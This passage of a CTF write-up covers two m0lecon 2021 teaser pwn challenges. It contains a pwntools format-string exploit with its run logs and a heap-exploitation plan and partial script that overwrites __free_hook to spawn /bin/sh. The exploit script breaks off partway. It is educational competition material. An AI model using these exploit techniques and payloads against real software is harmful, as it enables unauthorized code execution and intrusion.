+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_38 [</span><span style="color:#ffcc66;">24</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_20</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_20 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_58 </span><span style="color:#f29e74;">= &amp;</span><span>local_60</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(
+</span><span>      </span><span style="color:#bae67e;">&quot;Welcome to my super secure login! Ready to enter the password? We also have a nice anti-botmechanism which asks you to sum each character!&quot;
+</span><span>      )</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_64 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">while</span><span>( </span><span style="color:#ffcc66;">true </span><span>) {
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffcc66;">0xf </span><span style="color:#f29e74;">&lt;</span><span> local_64) {
+</span><span>      </span><span style="color:#ffd580;">win</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(local_20 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>        </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">rand</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    uVar4 </span><span style="color:#f29e74;">= </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint</span><span>)(iVar1 </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">0x1f</span><span>) </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">0x18</span><span style="color:#ccc9c2cc;">;
+</span><span>    local_50 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">long</span><span>)(</span><span style="color:#ffa759;">int</span><span>)((iVar1 </span><span style="color:#f29e74;">+</span><span> uVar4 </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span>) </span><span style="color:#f29e74;">-</span><span> uVar4)</span><span style="color:#ccc9c2cc;">;
+</span><span>    local_48 </span><span style="color:#f29e74;">=</span><span> local_50</span><span style="color:#ccc9c2cc;">;
+</span><span>    iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">rand</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    uVar4 </span><span style="color:#f29e74;">= </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint</span><span>)(iVar1 </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">0x1f</span><span>) </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">0x1d</span><span style="color:#ccc9c2cc;">;
+</span><span>    local_40 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">long</span><span>)(</span><span style="color:#ffa759;">int</span><span>)(((iVar1 </span><span style="color:#f29e74;">+</span><span> uVar4 </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">7</span><span>) </span><span style="color:#f29e74;">-</span><span> uVar4) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Give me the </span><span style="color:#ffcc66;">%d</span><span style="color:#bae67e;"> secret, summed to </span><span style="color:#ffcc66;">%ld</span><span style="color:#bae67e;">!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>(ulong)(local_64 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ffa759;">U</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span>local_40</span><span style="color:#ccc9c2cc;">,
+</span><span>           (ulong)(local_64 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ffa759;">U</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">fgets</span><span>(local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x13</span><span style="color:#ccc9c2cc;">,</span><span>stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>    iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">atoi</span><span>(local_38)</span><span style="color:#ccc9c2cc;">;
+</span><span>    local_60 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">long</span><span>)iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>    sVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strspn</span><span>(local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;0123456789&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    sVar3 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>(local_38)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(sVar2 </span><span style="color:#f29e74;">!= </span><span>sVar3) {
+</span><span>      local_60 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Your input is: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">printf</span><span>(local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_60 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_48 </span><span style="color:#f29e74;">!=</span><span> local_50) {
+</span><span>      </span><span style="color:#f28779;">printf</span><span>(
+</span><span>            </span><span style="color:#bae67e;">&quot;Looks like some memory corruption happened. Blame it on cosmic rays but I can</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">t letyou in.&quot;
+</span><span>            )</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_50 </span><span style="color:#f29e74;">+</span><span> local_40 </span><span style="color:#f29e74;">!=</span><span> local_60) {
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;NOPE, GET OUT OF MY SERVER!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    local_64 </span><span style="color:#f29e74;">=</span><span> local_64 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;??????&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>It generates and transforms two random numbers, takes an input, and then compares the sum of those two transformed numbers to your numerical input (atoi). So, couple things to note here:</p>
+<ul>
+<li>If your input contains any non digit characters it will terminate</li>
+<li>It's vulnerable to a format string vulnerability (after the check for non digit chararacters but before the termiantion)</li>
+<li>Right at the top it adds the address of local_60 (your parsed input) to the stack which is quite suspicious</li>
+</ul>
+<p>I quickly realized we could dodge the digit check by setting local_60 to a nonzero value with the %n operator but that didn't get me to the flag. The key realization was that you can dynamically control the width of a format string using an * instead of a number -- it will just pull an argument and use that. Additionally, you can control this positionally in a similar manner as a normal selector. So we have the ability to overwrite local_60 with the number of characters written so far, and the ability to pull a value off the stack positionally and write that many spaces to stdout. We can put this together to dynamically compute the sum of local_50 and local_40 and write it to local_60.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>hashlib </span><span style="color:#ffa759;">import </span><span>sha256
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span style="color:#ffa759;">import </span><span>time
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;chall&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">solvepow</span><span>(</span><span style="color:#ffcc66;">p</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n</span><span>):
+</span><span>    s </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    starting </span><span style="color:#f29e74;">= </span><span>s</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;with &#39;</span><span>)[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">10</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    s1 </span><span style="color:#f29e74;">= </span><span>s</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;in &#39;</span><span>)[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span>n]
+</span><span>    i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Solving PoW...&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#ffd580;">sha256</span><span>((starting</span><span style="color:#f29e74;">+</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">hexdigest</span><span>()[</span><span style="color:#f29e74;">-</span><span>n</span><span style="color:#ccc9c2cc;">:</span><span>] </span><span style="color:#f29e74;">== </span><span>s1</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>():
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Solved!&quot;</span><span>)
+</span><span>            p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(starting </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        i </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;challs.m0lecon.it&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1907</span><span>)
+</span><span>        </span><span style="color:#ffd580;">solvepow</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">5</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>r
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;b *signin+270</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">c</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">deref $rsp&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">0xf</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">1</span><span>):
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%*10$c%*11$c%8$n&quot;</span><span>)
+</span><span>
+</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cat flag.txt;exit;&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>((</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag found: &quot; </span><span style="color:#f29e74;">+ </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;(ptm{.*})&quot;</span><span style="color:#ccc9c2cc;">, </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python solve.py REMOTE
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/m0lecon-teaser/another_login/chall&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>[+] Opening connection to challs.m0lecon.it on port 1907: Done
+</span><span>Solving PoW...
+</span><span>Solved!
+</span><span>/home/sky/Dropbox/ctf/m0lecon-teaser/another_login/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+</span><span>  p.sendline(starting + str(i))
+</span><span>[+] Receiving all data: Done (2.73KB)
+</span><span>[*] Closed connection to challs.m0lecon.it port 1907
+</span><span>[*] flag found: ptm{D1d_u_r3ad_th3_0per4t0r_m4nua1_b3f0re_l0gging_1n?}
+</span><span>[*] Switching to interactive mode
+</span><span>[*] Got EOF while reading in interactive
+</span><span>$ 
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python solve.py REMOTE
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/m0lecon-teaser/yet_another_login/chall&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>[+] Opening connection to challs.m0lecon.it on port 5556: Done
+</span><span>Solving PoW...
+</span><span>Solved!
+</span><span>/home/sky/Dropbox/ctf/m0lecon-teaser/yet_another_login/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+</span><span>  p.sendline(starting + str(i))
+</span><span>[+] Receiving all data: Done (2.96KB)
+</span><span>[*] Closed connection to challs.m0lecon.it port 5556
+</span><span>[*] flag found: ptm{N0w_th1s_1s_th3_r34l_s3rv3r!_a526fd7c2b}
+</span><span>[*] Switching to interactive mode
+</span><span>[*] Got EOF while reading in interactive
+</span><span>$ 
+</span></code></pre>
+<h1 id="donut-factory">donut factory</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Come visit our factory to create your custom donuts!
+</span><span>
+</span><span>nc challs.m0lecon.it 1743
+</span></code></pre>
+<p><a href="/ctf/m0lecon-2021-teaser/donut/donut">donut</a>
+<a href="/ctf/m0lecon-2021-teaser/donut/libc.so.6">libc-2.31.so</a></p>
+<p>Exploit looks like so:</p>
+<ol>
+<li>leak heap address (and thus program base)</li>
+<li>allocate big chunk so malloc uses mmap and then leak mmap base (and thus libc)</li>
+<li>embed a fake chunk inside a bigger allocated chunk and then free the fake chunk</li>
+<li>overwrite the fake chunk so that it's next pointer points to __free_hook - 1</li>
+<li>allocate chunk of appropriate size so malloc returns __free_hook - 1 and write system to it</li>
+<li>allocate a chunk containing "/bin/sh" and free it, calling system("/bin/sh")</li>
+</ol>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>hashlib </span><span style="color:#ffa759;">import </span><span>sha256
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;donut&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>ld </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./ld-2.31.so&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">solvepow</span><span>(</span><span style="color:#ffcc66;">p</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n</span><span>):
+</span><span>    s </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    starting </span><span style="color:#f29e74;">= </span><span>s</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;with &#39;</span><span>)[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">10</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    s1 </span><span style="color:#f29e74;">= </span><span>s</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;in &#39;</span><span>)[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span>n]
+</span><span>    i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Solving PoW...&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#ffd580;">sha256</span><span>((starting</span><span style="color:#f29e74;">+</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">hexdigest</span><span>()[</span><span style="color:#f29e74;">-</span><span>n</span><span style="color:#ccc9c2cc;">:</span><span>] </span><span style="color:#f29e74;">== </span><span>s1</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>():
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Solved!&quot;</span><span>)
+</span><span>            p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(starting </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        i </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;challs.m0lecon.it&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1743</span><span>)
+</span><span>        </span><span style="color:#ffd580;">solvepow</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">5</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>r
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>(exe</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;c&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>(exe</span><span style="color:#f29e74;">.</span><span>path)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">create_donut</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">size</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">data</span><span>):
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;c&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;(y/n)</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;y&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(size)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(data)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;retrieve your donut! &quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># first we&#39;re going to leak some addresses
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># &quot;donut codes&quot; are raw pointers, which allows us to trivially leak heap (and thus program base) addresses
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># mmap (and thus libc) can be leaked also, because we&#39;re allowed to create arbitrary size allocations
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># for sufficiently large allocations, malloc will service the request by mapping memory
+</span><span>
+</span><span>
+</span><span>    heap_chunk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;fake name&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;leaked heap chunk address: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(heap_chunk))
+</span><span>
+</span><span>    mmap_chunk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2097152</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;fake name&quot;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># beeg beeg malloc so its mmapped
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;leaked mmapped address: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(mmap_chunk))
+</span><span>
+</span><span>    heap_base </span><span style="color:#f29e74;">= </span><span>heap_chunk </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x16c0
+</span><span>    program_base </span><span style="color:#f29e74;">= </span><span>heap_chunk </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x86c0
+</span><span>    libc_base </span><span style="color:#f29e74;">= </span><span>mmap_chunk </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x203ff0
+</span><span>
+</span><span>    free_hook </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x1eeb28
+</span><span>    system </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x55410
